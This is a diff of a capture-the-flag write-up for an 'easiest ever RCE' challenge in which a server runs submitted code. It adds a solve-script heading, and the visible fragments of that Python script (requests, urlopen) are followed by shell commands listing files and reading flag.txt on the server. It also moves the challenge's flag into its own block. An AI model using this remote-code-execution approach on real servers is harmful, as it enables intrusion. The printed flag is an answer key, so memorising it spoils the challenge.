@@ -1,6 +1,6 @@
 ---
 created: 2024-07-19T16:06
-updated: 2024-07-21T16:11
+updated: 2024-07-21T18:39
 points: 100
 solves: 247
 ---
@@ -8,6 +8,8 @@ solves: 247
 We are sending code to the server... and the server is running it.
 
 Easiest ever RCE?
+
+## solve script
 
 ```python
 import requests
@@ -22,5 +24,8 @@ urlopen(httprequest)""".strip()
     
 # $ ls
 # $ cat flag.txt
-# ictf{d1_color_picker_fr_2ce0dd3d}
+```
+
+```flag
+ictf{d1_color_picker_fr_2ce0dd3d}
 ```
